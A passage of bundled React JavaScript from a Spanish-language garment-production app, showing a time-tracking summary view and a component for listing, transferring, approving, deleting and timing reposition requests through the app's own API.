                  /* @__PURE__ */ jsx59(Clock, { className: "w-4 h-4 inline mr-1" }),
                  "Tiempo: ",
                  step.timeSpent
                ] }),
                step.user && /* @__PURE__ */ jsxs28("p", { className: "text-sm text-gray-600", children: [
                  /* @__PURE__ */ jsx59(User, { className: "w-4 h-4 inline mr-1" }),
                  step.user
                ] })
              ] }),
              /* @__PURE__ */ jsx59(
                Badge,
                {
                  variant: step.status === "completed" ? "default" : step.status === "current" ? "secondary" : "outline",
                  children: step.status === "completed" ? "Completado" : step.status === "current" ? "En Proceso" : "Pendiente"
                }
              )
            ] }),
            step.notes && /* @__PURE__ */ jsx59("p", { className: "text-sm text-gray-700 mt-2 bg-white p-2 rounded border", children: step.notes })
          ] }) })
        ] }, step.id)) }) })
      ] }),
      /* @__PURE__ */ jsxs28(Card, { children: [
        /* @__PURE__ */ jsx59(CardHeader, { children: /* @__PURE__ */ jsx59(CardTitle, { className: "text-lg", children: "Resumen de Tiempos" }) }),
        /* @__PURE__ */ jsx59(CardContent, { children: /* @__PURE__ */ jsxs28("div", { className: "space-y-4", children: [
          /* @__PURE__ */ jsx59("div", { className: "grid grid-cols-2 md:grid-cols-3 gap-4", children: trackingData.areaTimes && Object.entries(trackingData.areaTimes).map(([area, minutes]) => /* @__PURE__ */ jsxs28("div", { className: "bg-gray-50 p-3 rounded-lg", children: [
            /* @__PURE__ */ jsx59("h4", { className: "font-medium text-sm", children: getAreaDisplayName(area) }),
            /* @__PURE__ */ jsxs28("p", { className: "text-lg font-bold text-blue-600", children: [
              Math.floor(minutes / 60),
              "h ",
              Math.round(minutes % 60),
              "m"
            ] })
          ] }, area)) }),
          /* @__PURE__ */ jsxs28("div", { className: "border-t pt-4", children: [
            /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-center", children: [
              /* @__PURE__ */ jsx59("h3", { className: "text-lg font-semibold", children: "Tiempo Total:" }),
              /* @__PURE__ */ jsx59("div", { className: "text-2xl font-bold text-green-600", children: trackingData.totalTime.formatted })
            ] }),
            /* @__PURE__ */ jsxs28("p", { className: "text-sm text-gray-600 mt-1", children: [
              "Total de minutos: ",
              Math.round(trackingData.totalTime.minutes)
            ] })
          ] })
        ] }) })
      ] }),
      /* @__PURE__ */ jsxs28(Card, { children: [
        /* @__PURE__ */ jsx59(CardHeader, { children: /* @__PURE__ */ jsx59(CardTitle, { className: "text-lg", children: "Historial de Movimientos" }) }),
        /* @__PURE__ */ jsx59(CardContent, { children: /* @__PURE__ */ jsx59("div", { className: "space-y-3", children: trackingData.history.map((event) => /* @__PURE__ */ jsxs28("div", { className: "flex items-start gap-3 p-3 bg-gray-50 rounded-lg", children: [
          /* @__PURE__ */ jsx59("div", { className: "w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0" }),
          /* @__PURE__ */ jsxs28("div", { className: "flex-1 min-w-0", children: [
            /* @__PURE__ */ jsxs28("div", { className: "flex justify-between items-start", children: [
              /* @__PURE__ */ jsxs28("div", { children: [
                /* @__PURE__ */ jsx59("p", { className: "font-medium text-sm", children: event.action }),
                /* @__PURE__ */ jsx59("p", { className: "text-sm text-gray-600", children: event.description }),
                event.fromArea && event.toArea && /* @__PURE__ */ jsxs28("div", { className: "flex items-center gap-2 mt-1", children: [
                  /* @__PURE__ */ jsx59(Badge, { variant: "outline", className: "text-xs", children: getAreaDisplayName(event.fromArea) }),
                  /* @__PURE__ */ jsx59(ArrowRight, { className: "w-3 h-3 text-gray-400" }),
                  /* @__PURE__ */ jsx59(Badge, { variant: "outline", className: "text-xs", children: getAreaDisplayName(event.toArea) })
                ] })
              ] }),
              /* @__PURE__ */ jsx59("div", { className: "text-xs text-gray-500 flex-shrink-0", children: formatDate(event.timestamp) })
            ] }),
            /* @__PURE__ */ jsxs28("p", { className: "text-xs text-gray-500 mt-1", children: [
              "Por: ",
              event.userName
            ] })
          ] })
        ] }, event.id)) }) })
      ] })
    ] })
  ] }) });
}

// client/src/components/repositions/RepositionList.tsx
var import_sweetalert27 = __toESM(require_sweetalert2_all(), 1);
import { Fragment as Fragment10, jsx as jsx60, jsxs as jsxs29 } from "react/jsx-runtime";
var areas2 = [
  "patronaje",
  "corte",
  "bordado",
  "ensamble",
  "plancha",
  "calidad",
  "envios",
  "operaciones",
  "admin",
  "almacen",
  "dise\xF1o"
];
var statusColors2 = {
  pendiente: "bg-yellow-100 text-yellow-800",
  aprobado: "bg-green-100 text-green-800",
  rechazado: "bg-red-100 text-red-800",
  en_proceso: "bg-blue-100 text-blue-800",
  completado: "bg-gray-100 text-gray-800",
  eliminado: "bg-red-100 text-red-800"
};
var urgencyColors2 = {
  urgente: "bg-red-100 text-red-800",
  intermedio: "bg-yellow-100 text-yellow-800",
  poco_urgente: "bg-green-100 text-green-800"
};
var accidentFilters = [
  { value: "all", label: "Todos los accidentes" },
  { value: "falla_tela", label: "Falla de tela" },
  { value: "accidente_maquina", label: "Accidente con m\xE1quina" },
  { value: "accidente_operario", label: "Accidente por operario" },
  { value: "actividad_mal_realizada", label: "Actividad mal realizada" },
  { value: "defecto_fabricacion", label: "Defecto en fabricaci\xF3n" },
  { value: "error_diseno", label: "Error de dise\xF1o" },
  { value: "problema_calidad", label: "Problema de calidad" }
];
function RepositionList({ userArea }) {
  const [showForm, setShowForm] = useState35(false);
  const [selectedReposition, setSelectedReposition] = useState35(null);
  const [trackedReposition, setTrackedReposition] = useState35(null);
  const [printSummaryReposition, setPrintSummaryReposition] = useState35(null);
  const [filterArea, setFilterArea] = useState35(userArea === "admin" || userArea === "envios" || userArea === "dise\xF1o" ? "all" : userArea);
  const [showHistory, setShowHistory] = useState35(false);
  const [includeDeleted, setIncludeDeleted] = useState35(false);
  const [searchTerm, setSearchTerm] = useState35("");
  const [filterAccident, setFilterAccident] = useState35("all");
  const [activeTimers, setActiveTimers] = useState35({});
  const [completionNotes, setCompletionNotes] = useState35({});
  const [transferModalId, setTransferModalId] = useState35(null);
  const [manualTimes, setManualTimes] = useState35({});
  const queryClient2 = useQueryClient();
  const { data: repositions = [], isLoading } = useQuery({
    queryKey: ["repositions", filterArea, showHistory, includeDeleted],
    queryFn: async () => {
      let url = showHistory && (userArea === "admin" || userArea === "envios") ? `/api/repositions/all?includeDeleted=${includeDeleted}` : filterArea && filterArea !== "all" ? `/api/repositions?area=${filterArea}` : "/api/repositions";
      const response = await fetch(url);
      if (!response.ok) throw new Error("Error al cargar las reposiciones");
      const data = await response.json();
      if (userArea !== "admin" && userArea !== "envios") {
        return data.filter((repo) => repo.status !== "completado" && repo.status !== "eliminado");
      }
      return data;
    },
    refetchInterval: 5e3,
    // Refetch every 5 seconds
    refetchOnMount: true,
    refetchOnWindowFocus: true
  });
  const { data: notifications = [] } = useQuery({
    queryKey: ["/api/notifications"],
    queryFn: async () => {
      const res = await fetch("/api/notifications");
      if (!res.ok) throw new Error("Error al cargar notificaciones");
      const allNotifications = await res.json();
      return allNotifications.filter(
        (n) => !n.read && (n.type?.includes("reposition") || n.type?.includes("completion") || n.type === "completion_approval_needed")
      );
    }
  });
  const { data: pendingTransfers = [] } = useQuery({
    queryKey: ["transferencias-pendientes-reposicion"],
    queryFn: async () => {
      const response = await fetch("/api/repositions/transfers/pending");
      if (!response.ok) return [];
      return response.json();
    }
  });
  const transferMutation = useMutation({
    mutationFn: async ({ repositionId, toArea, notes, consumoTela }) => {
      const response = await fetch(`/api/repositions/${repositionId}/transfer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ toArea, notes, consumoTela })
      });
      if (!response.ok) throw new Error("Error al transferir la reposici\xF3n");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Solicitud transferida correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const approveMutation = useMutation({
    mutationFn: async ({ repositionId, action, notes }) => {
      const response = await fetch(`/api/repositions/${repositionId}/approval`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action, notes })
      });
      if (!response.ok) throw new Error("Error al procesar la aprobaci\xF3n");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Solicitud procesada correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const deleteMutation = useMutation({
    mutationFn: async ({ repositionId, reason }) => {
      console.log("Deleting reposition:", repositionId, "with reason:", reason);
      const response = await fetch(`/api/repositions/${repositionId}`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ reason })
      });
      const data = await response.json();
      console.log("Delete response:", response.status, data);
      if (!response.ok) {
        throw new Error(data.message || "Failed to delete reposition");
      }
      return data;
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert27.default.fire({
        title: "\xA1Eliminada!",
        text: "Reposici\xF3n eliminada correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    },
    onError: (error) => {
      console.error("Delete error:", error);
      import_sweetalert27.default.fire({
        title: "Error",
        text: error.message || "No se pudo eliminar la reposici\xF3n",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const completeMutation = useMutation({
    mutationFn: async ({ repositionId, notes }) => {
      const response = await fetch(`/api/repositions/${repositionId}/complete`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ notes })
      });
      if (!response.ok) throw new Error("Error al completar la reposici\xF3n");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Proceso completado correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const processTransferMutation = useMutation({
    mutationFn: async ({ transferId, action }) => {
      const response = await fetch(`/api/repositions/transfers/${transferId}/process`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action })
      });
      if (!response.ok) throw new Error("Error al procesar la transferencia");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      queryClient2.invalidateQueries({ queryKey: ["transferencias-pendientes-reposicion"] });
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Transferencia procesada correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const startTimerMutation = useMutation({
    mutationFn: async (repositionId) => {
      console.log("Starting timer for reposition:", repositionId, "user area:", userArea);
      const response = await fetch(`/api/repositions/${repositionId}/timer/start`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ area: userArea })
      });
      const data = await response.json();
      console.log("Timer start response:", response.status, data);
      if (!response.ok) {
        throw new Error(data.message || "Error al iniciar el cron\xF3metro");
      }
      return data;
    },
    onSuccess: (data, repositionId) => {
      setActiveTimers((prev) => ({ ...prev, [repositionId]: true }));
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert27.default.fire({
        title: "\xA1Cron\xF3metro iniciado!",
        text: "Se ha comenzado a contar el tiempo para esta reposici\xF3n",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
    },
    onError: (error) => {
      console.error("Timer start error:", error);
      import_sweetalert27.default.fire({
        title: "Error",
        text: error.message || "No se pudo iniciar el cron\xF3metro",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const handleStopTimer = async (repositionId) => {
    try {
      await fetch(`/api/repositions/${repositionId}/timer/stop`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        credentials: "include",
        body: JSON.stringify({ area: userArea })
      });
      setActiveTimers((prev) => ({ ...prev, [repositionId]: false }));
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Tiempo registrado correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
    } catch (error) {
      import_sweetalert27.default.fire({
        title: "Error",
        text: "Error al detener el cron\xF3metro",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  };
  const updateManualTime = (repositionId, field, value) => {
    setManualTimes((prev) => ({
      ...prev,
      [repositionId]: {
        ...prev[repositionId],
        [field]: value
      }
    }));
  };
  const handleSubmitManualTime = async (repositionId) => {
    const timeData = manualTimes[repositionId];
    if (!timeData?.startTime || !timeData?.endTime) {
      import_sweetalert27.default.fire({
        title: "Error",
        text: "Debe completar la hora de inicio y fin",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
      return;
    }
    try {
      const response = await fetch(`/api/repositions/${repositionId}/timer/manual`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        credentials: "include",
        body: JSON.stringify({
          startTime: timeData.startTime,
          endTime: timeData.endTime,
          date: timeData.date || (/* @__PURE__ */ new Date()).toISOString().split("T")[0]
        })
      });
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Error al registrar tiempo");
      }
      import_sweetalert27.default.fire({
        title: "\xA1\xC9xito!",
        text: "Tiempo registrado correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
      setManualTimes((prev) => {
        const updated = { ...prev };
        delete updated[repositionId];
        return updated;
      });
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
    } catch (error) {
      import_sweetalert27.default.fire({
        title: "Error",
        text: error instanceof Error ? error.message : "Error al registrar tiempo",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  };
  const handleTransfer = async (repositionId) => {
    try {
      const response = await fetch(`/api/repositions/${repositionId}/timer`);
      const timer = await response.json();
      if (!timer || !timer.manualStartTime && !timer.startTime) {
        import_sweetalert27.default.fire({
          title: "Tiempo no registrado",
          text: "Debe registrar el tiempo de trabajo antes de transferir la reposici\xF3n.",
          icon: "warning",
          confirmButtonColor: "#8B5CF6",
          confirmButtonText: "Entendido"
        });
        return;
      }
    } catch (error) {
      console.error("Error verificando timer:", error);
    }
    const { value: toArea } = await import_sweetalert27.default.fire({
      title: "Transferir a \xC1rea",
      input: "select",
      inputOptions: areas2.reduce((acc, area) => {
        acc[area] = area.charAt(0).toUpperCase() + area.slice(1);
        return acc;
      }, {}),
      inputPlaceholder: "Selecciona un \xE1rea",
      showCancelButton: true,
      confirmButtonColor: "#8B5CF6",
      inputValidator: (value) => {
        if (!value) return "Debes seleccionar un \xE1rea";
      }
    });
    if (toArea) {
      let consumoTela = null;
      if (userArea === "corte") {
        const { value: consumo } = await import_sweetalert27.default.fire({
          title: "Consumo de Tela",
          text: "Especifica la cantidad de tela utilizada (en metros)",
          input: "number",
          inputAttributes: {
            min: "0",
            step: "0.1",
            placeholder: "0.0"
          },
          showCancelButton: true,
          confirmButtonColor: "#8B5CF6",
          inputValidator: (value) => {
            if (!value || parseFloat(value) < 0) {
              return "Debes especificar una cantidad v\xE1lida de tela";
            }
          }
        });
        if (consumo === void 0) return;
        consumoTela = parseFloat(consumo);
      }
      const { value: notes } = await import_sweetalert27.default.fire({
        title: "Notas de transferencia",
        input: "textarea",
        inputPlaceholder: "Notas adicionales (opcional)",
        showCancelButton: true,
        confirmButtonColor: "#8B5CF6"
      });
      if (notes !== void 0) {
        transferMutation.mutate({ repositionId, toArea, notes, consumoTela });
      }
    }
  };
  const handleApproval = async (repositionId, action) => {
    const { value: notes } = await import_sweetalert27.default.fire({
      title: `${action === "aprobado" ? "Aprobar" : "Rechazar"} Solicitud`,
      input: "textarea",
      inputPlaceholder: "Comentarios (opcional)",
      showCancelButton: true,
      confirmButtonColor: "#8B5CF6"
    });
    if (notes !== void 0) {
      approveMutation.mutate({ repositionId, action, notes });
    }
  };
  const handleDelete = async (repositionId) => {
    const { value: reason } = await import_sweetalert27.default.fire({
      title: "\xBFEst\xE1s seguro?",
      text: "Esta acci\xF3n eliminar\xE1 la reposici\xF3n permanentemente",
      input: "textarea",
      inputPlaceholder: "Describe el motivo por el cual esta reposici\xF3n ya no es necesaria *",
      icon: "warning",
      showCancelButton: true,
      confirmButtonColor: "#DC2626",
      cancelButtonColor: "#6B7280",
      confirmButtonText: "S\xED, eliminar",
      cancelButtonText: "Cancelar",
      inputValidator: (value) => {
        if (!value || value.trim().length === 0) {
          return "Debes proporcionar un motivo para la eliminaci\xF3n";
        }
        if (value.trim().length < 10) {
          return "El motivo debe tener al menos 10 caracteres";
        }
      }
    });
    if (reason !== void 0 && reason.trim().length > 0) {
      deleteMutation.mutate({ repositionId, reason: reason.trim() });
    }
  };
  const handleComplete = async (repositionId) => {
    const { value: notes } = await import_sweetalert27.default.fire({
      title: "Finalizar Proceso",
      input: "textarea",
      inputPlaceholder: "Notas de finalizaci\xF3n (opcional)",
      showCancelButton: true,
      confirmButtonColor: "#8B5CF6",
      confirmButtonText: userArea === "admin" || userArea === "envios" ? "Finalizar" : "Solicitar Finalizaci\xF3n"
    });
    if (notes !== void 0) {
      completeMutation.mutate({ repositionId, notes });
    }
  };
  const handleProcessTransfer = async (transferId, action) => {
    const result = await import_sweetalert27.default.fire({
      title: `\xBF${action === "accepted" ? "Aceptar" : "Rechazar"} transferencia?`,
      text: `Esta acci\xF3n ${action === "accepted" ? "mover\xE1 la reposici\xF3n a tu \xE1rea" : "rechazar\xE1 la transferencia"}`,
      icon: "question",
      showCancelButton: true,
      confirmButtonColor: action === "accepted" ? "#10B981" : "#EF4444",
      confirmButtonText: action === "accepted" ? "Aceptar" : "Rechazar",
      cancelButtonText: "Cancelar"
    });
    if (result.isConfirmed) {
      processTransferMutation.mutate({ transferId, action });
    }
  };
  const handleStartTimer = (repositionId) => {
    startTimerMutation.mutate(repositionId);
  };
  const filteredRepositions = repositions.filter((reposition) => {
    const matchesSearch = searchTerm === "" || reposition.folio.toLowerCase().includes(searchTerm.toLowerCase()) || reposition.solicitanteNombre.toLowerCase().includes(searchTerm.toLowerCase()) || reposition.modeloPrenda.toLowerCase().includes(searchTerm.toLowerCase()) || reposition.tipoAccidente?.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesAccident = filterAccident === "all" || reposition.tipoAccidente?.toLowerCase().includes(filterAccident.replace("_", " "));
    return matchesSearch && matchesAccident;
  });
  if (isLoading) {
    return /* @__PURE__ */ jsx60("div", { className: "text-center py-8", children: "Cargando solicitudes..." });
  }
  return /* @__PURE__ */ jsxs29("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsxs29("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsx60("h1", { className: "text-3xl font-bold text-purple-800", children: userArea === "dise\xF1o" ? "Reposiciones Aprobadas" : "Solicitudes de Reposici\xF3n" }),
      userArea !== "dise\xF1o" && /* @__PURE__ */ jsxs29(Button, { onClick: () => setShowForm(true), className: "bg-purple-600 hover:bg-purple-700", children: [
        /* @__PURE__ */ jsx60(Plus, { className: "w-4 h-4 mr-2" }),
        "Nueva Solicitud"
      ] })
    ] }),
    /* @__PURE__ */ jsxs29("div", { className: "flex flex-wrap gap-4 items-center", children: [
      /* @__PURE__ */ jsxs29("div", { className: "relative", children: [
        /* @__PURE__ */ jsx60(Search, { className: "absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" }),
        /* @__PURE__ */ jsx60(
          Input,
          {
            placeholder: "Buscar por folio, solicitante, modelo...",
            value: searchTerm,
            onChange: (e) => setSearchTerm(e.target.value),
            className: "pl-10 w-64"
          }
        )
      ] }),
      /* @__PURE__ */ jsxs29(Select2, { value: filterAccident, onValueChange: setFilterAccident, children: [
        /* @__PURE__ */ jsx60(SelectTrigger2, { className: "w-48", children: /* @__PURE__ */ jsx60(SelectValue2, { placeholder: "Filtrar por accidente" }) }),
        /* @__PURE__ */ jsx60(SelectContent2, { children: accidentFilters.map((filter) => /* @__PURE__ */ jsx60(SelectItem2, { value: filter.value, children: filter.label }, filter.value)) })
      ] }),
      (userArea === "admin" || userArea === "envios" || userArea === "dise\xF1o") && /* @__PURE__ */ jsxs29(Fragment10, { children: [
        /* @__PURE__ */ jsxs29(Select2, { value: filterArea, onValueChange: setFilterArea, children: [
          /* @__PURE__ */ jsx60(SelectTrigger2, { className: "w-48", children: /* @__PURE__ */ jsx60(SelectValue2, { placeholder: "Filtrar por \xE1rea" }) }),
          /* @__PURE__ */ jsxs29(SelectContent2, { children: [
            /* @__PURE__ */ jsx60(SelectItem2, { value: "all", children: userArea === "dise\xF1o" ? "Todas las aprobadas" : "Todas las \xE1reas" }),
            areas2.map((area) => /* @__PURE__ */ jsx60(SelectItem2, { value: area, children: area.charAt(0).toUpperCase() + area.slice(1) }, area))
          ] })
        ] }),
        (userArea === "admin" || userArea === "envios") && /* @__PURE__ */ jsxs29(Fragment10, { children: [
          /* @__PURE__ */ jsxs29("div", { className: "flex items-center space-x-2", children: [
            /* @__PURE__ */ jsx60(
              Switch3,
              {
                id: "show-history",
                checked: showHistory,
                onCheckedChange: setShowHistory
              }
            ),
            /* @__PURE__ */ jsx60(Label2, { htmlFor: "show-history", children: "Ver historial completo" })
          ] }),
          showHistory && /* @__PURE__ */ jsxs29("div", { className: "flex items-center space-x-2", children: [
            /* @__PURE__ */ jsx60(
              Switch3,
              {
                id: "include-deleted",
                checked: includeDeleted,
                onCheckedChange: setIncludeDeleted
              }
            ),
            /* @__PURE__ */ jsx60(Label2, { htmlFor: "include-deleted", children: "Incluir eliminadas" })
          ] })
        ] })
      ] })
    ] }),
    pendingTransfers.length > 0 && /* @__PURE__ */ jsxs29(Card, { className: "border-orange-200 bg-orange-50", children: [
      /* @__PURE__ */ jsx60(CardHeader, { className: "pb-3", children: /* @__PURE__ */ jsxs29(CardTitle, { className: "flex items-center gap-2 text-orange-800", children: [
        /* @__PURE__ */ jsx60(Bell, { className: "w-5 h-5" }),
        "Transferencias Pendientes (",
        pendingTransfers.length,
        ")"
      ] }) }),
      /* @__PURE__ */ jsx60(CardContent, { children: /* @__PURE__ */ jsx60("div", { className: "space-y-3", children: pendingTransfers.map((transfer) => /* @__PURE__ */ jsxs29("div", { className: "flex items-center justify-between p-3 bg-white rounded-lg border", children: [
        /* @__PURE__ */ jsxs29("div", { children: [
          /* @__PURE__ */ jsxs29("p", { className: "font-semibold text-gray-800", children: [
            "Reposici\xF3n desde ",
            transfer.fromArea
          ] }),
          /* @__PURE__ */ jsx60("p", { className: "text-sm text-gray-600", children: transfer.notes && `Notas: ${transfer.notes}` }),
          /* @__PURE__ */ jsx60("p", { className: "text-xs text-gray-500", children: new Date(transfer.createdAt).toLocaleString() })
        ] }),
        /* @__PURE__ */ jsxs29("div", { className: "flex gap-2", children: [
          /* @__PURE__ */ jsxs29(
            Button,
            {
              size: "sm",
              className: "bg-green-600 hover:bg-green-700",
              onClick: () => handleProcessTransfer(transfer.id, "accepted"),
              children: [
                /* @__PURE__ */ jsx60(CircleCheckBig, { className: "w-4 h-4 mr-1" }),
                "Aceptar"
              ]
            }
          ),
          /* @__PURE__ */ jsxs29(
            Button,
            {
              size: "sm",
              variant: "outline",
              className: "text-red-600 hover:bg-red-50",
              onClick: () => handleProcessTransfer(transfer.id, "rejected"),
              children: [
                /* @__PURE__ */ jsx60(CircleX, { className: "w-4 h-4 mr-1" }),
                "Rechazar"
              ]
            }
          )
        ] })
      ] }, transfer.id)) }) })
    ] }),
    /* @__PURE__ */ jsx60("div", { className: "grid gap-4", children: repositions.length === 0 ? /* @__PURE__ */ jsx60(Card, { children: /* @__PURE__ */ jsx60(CardContent, { className: "py-8 text-center text-gray-500", children: "No hay solicitudes de reposici\xF3n" }) }) : filteredRepositions.map((reposition) => /* @__PURE__ */ jsxs29(Card, { className: "hover:shadow-md transition-shadow", children: [
      /* @__PURE__ */ jsx60(CardHeader, { className: "pb-3", children: /* @__PURE__ */ jsxs29("div", { className: "flex justify-between items-start", children: [
        /* @__PURE__ */ jsxs29("div", { children: [
          /* @__PURE__ */ jsx60(CardTitle, { className: "text-lg text-purple-800", children: reposition.folio }),
          /* @__PURE__ */ jsxs29("p", { className: "text-sm text-gray-600 mt-1", children: [
            reposition.solicitanteNombre,
            " \u2022 ",
            reposition.modeloPrenda
          ] })
        ] }),
        /* @__PURE__ */ jsxs29("div", { className: "flex gap-2", children: [
          /* @__PURE__ */ jsx60(Badge, { className: statusColors2[reposition.status], children: reposition.status }),
          /* @__PURE__ */ jsx60(Badge, { className: urgencyColors2[reposition.urgencia], children: reposition.urgencia }),
          /* @__PURE__ */ jsx60(Badge, { variant: "outline", children: reposition.type })
        ] })
      ] }) }),
      /* @__PURE__ */ jsx60(CardContent, { children: /* @__PURE__ */ jsxs29("div", { className: "flex justify-between items-center", children: [
        /* @__PURE__ */ jsxs29("div", { className: "flex items-center gap-4 text-sm text-gray-600", children: [
          /* @__PURE__ */ jsxs29("span", { children: [
            "\xC1rea actual: ",
            reposition.currentArea
          ] }),
          /* @__PURE__ */ jsx60("span", { children: "\u2022" }),
          /* @__PURE__ */ jsx60("span", { children: new Date(reposition.createdAt).toLocaleString("es-ES", {
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            timeZone: "America/Mexico_City"
          }) })
        ] }),
        /* @__PURE__ */ jsxs29("div", { className: "flex gap-2", children: [
          /* @__PURE__ */ jsxs29(
            Button,
            {
              variant: "outline",
              size: "sm",
              onClick: () => setSelectedReposition(reposition.id),
              children: [
                /* @__PURE__ */ jsx60(Eye, { className: "w-4 h-4 mr-2" }),
                "Ver Detalles"
              ]
            }
          ),
          /* @__PURE__ */ jsxs29(
            Button,
            {
              variant: "outline",
              size: "sm",
              onClick: () => setTrackedReposition(reposition.id),
              className: "text-blue-600 hover:bg-blue-50",
              children: [
                /* @__PURE__ */ jsx60(MapPin, { className: "w-4 h-4 mr-2" }),
                "Seguimiento"
              ]
            }
          ),
          userArea === "ensamble" && /* @__PURE__ */ jsxs29(
            Button,
            {
              variant: "outline",
              size: "sm",
              onClick: () => setPrintSummaryReposition(reposition.id),
              className: "text-green-600 hover:bg-green-50",
              children: [
                /* @__PURE__ */ jsx60(Printer, { className: "w-4 h-4 mr-2" }),
                "Resumen"
              ]
            }
          ),
          reposition.currentArea === userArea && /* @__PURE__ */ jsx60(Fragment10, { children: reposition.status === "aprobado" && reposition.status !== "eliminado" && /* @__PURE__ */ jsxs29(Fragment10, { children: [
            /* @__PURE__ */ jsxs29(
              Button,
              {
                size: "sm",
                variant: "outline",
                onClick: () => handleTransfer(reposition.id),
                children: [
                  /* @__PURE__ */ jsx60(ArrowRight, { className: "w-4 h-4 mr-2" }),
                  "Transferir"
                ]
              }
            ),
            /* @__PURE__ */ jsxs29("div", { children: [
              /* @__PURE__ */ jsxs29(
                Button,
                {
                  size: "sm",
                  variant: "outline",
                  className: "text-green-600 hover:bg-green-50 mb-2",
                  onClick: () => setManualTimes((prev) => ({
                    ...prev,
                    [reposition.id]: prev[reposition.id] || { startTime: "", endTime: "", date: "" }
                  })),
                  children: [
                    /* @__PURE__ */ jsx60(Clock, { className: "w-4 h-4 mr-2" }),
                    "Registrar Tiempo Manual"
                  ]
                }
              ),
              manualTimes[reposition.id] && /* @__PURE__ */ jsxs29("div", { className: "space-y-2 mt-2", children: [
                /* @__PURE__ */ jsxs29("div", { className: "flex gap-2", children: [
                  /* @__PURE__ */ jsxs29("div", { className: "flex-1", children: [
                    /* @__PURE__ */ jsx60(Label2, { htmlFor: `start-time-${reposition.id}`, children: "Inicio:" }),
                    /* @__PURE__ */ jsx60(
                      Input,
                      {
                        type: "time",
                        id: `start-time-${reposition.id}`,
                        value: manualTimes[reposition.id]?.startTime || "",
                        onChange: (e) => updateManualTime(reposition.id, "startTime", e.target.value)
                      }
                    )
                  ] }),
                  /* @__PURE__ */ jsxs29("div", { className: "flex-1", children: [
                    /* @__PURE__ */ jsx60(Label2, { htmlFor: `end-time-${reposition.id}`, children: "Fin:" }),
                    /* @__PURE__ */ jsx60(
                      Input,
                      {
                        type: "time",
                        id: `end-time-${reposition.id}`,
                        value: manualTimes[reposition.id]?.endTime || "",
                        onChange: (e) => updateManualTime(reposition.id, "endTime", e.target.value)
                      }
                    )
                  ] })
                ] }),
                /* @__PURE__ */ jsxs29("div", { className: "flex gap-2", children: [
                  /* @__PURE__ */ jsx60(
                    Button,
                    {
                      size: "sm",
                      variant: "outline",
                      className: "text-green-600 hover:bg-green-50",
                      onClick: () => handleSubmitManualTime(reposition.id),
                      children: "Guardar Tiempo"
                    }
                  ),
                  /* @__PURE__ */ jsx60(
                    Button,
                    {
                      size: "sm",
                      variant: "outline",
                      className: "text-red-600 hover:bg-red-50",
                      onClick: () => setManualTimes((prev) => {
                        const updated = { ...prev };
                        delete updated[reposition.id];
                        return updated;
                      }),
                      children: "Cancelar"
                    }
                  )
                ] })
              ] })
            ] })
          ] }) }),
          (userArea === "operaciones" || userArea === "admin" || userArea === "envios") && reposition.status === "pendiente" && /* @__PURE__ */ jsxs29(Fragment10, { children: [
            /* @__PURE__ */ jsxs29(
              Button,
              {
                variant: "outline",
                size: "sm",
                className: "text-green-600 hover:bg-green-50",
                onClick: () => handleApproval(reposition.id, "aprobado"),
                children: [
                  /* @__PURE__ */ jsx60(CircleCheckBig, { className: "w-4 h-4 mr-2" }),
                  "Aprobar"
                ]
              }
            ),
            /* @__PURE__ */ jsxs29(
              Button,
              {
                variant: "outline",
                size: "sm",
                className: "text-red-600 hover:bg-red-50",
                onClick: () => handleApproval(reposition.id, "rechazado"),
                children: [
                  /* @__PURE__ */ jsx60(CircleX, { className: "w-4 h-4 mr-2" }),
                  "Rechazar"
                ]
              }
            )
          ] }),
